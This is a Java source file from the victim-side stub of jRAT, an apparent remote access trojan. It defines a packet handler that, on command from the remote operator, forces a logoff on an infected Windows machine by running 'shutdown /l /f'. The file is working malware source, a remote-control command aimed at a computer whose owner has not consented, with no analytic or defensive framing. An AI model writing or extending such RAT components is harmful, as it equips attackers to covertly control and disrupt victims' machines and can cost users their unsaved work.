package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;

import com.redpois0n.oslib.OperatingSystem;

public class Packet32LockComputer extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec("shutdown /l /f");
		}
	}

}
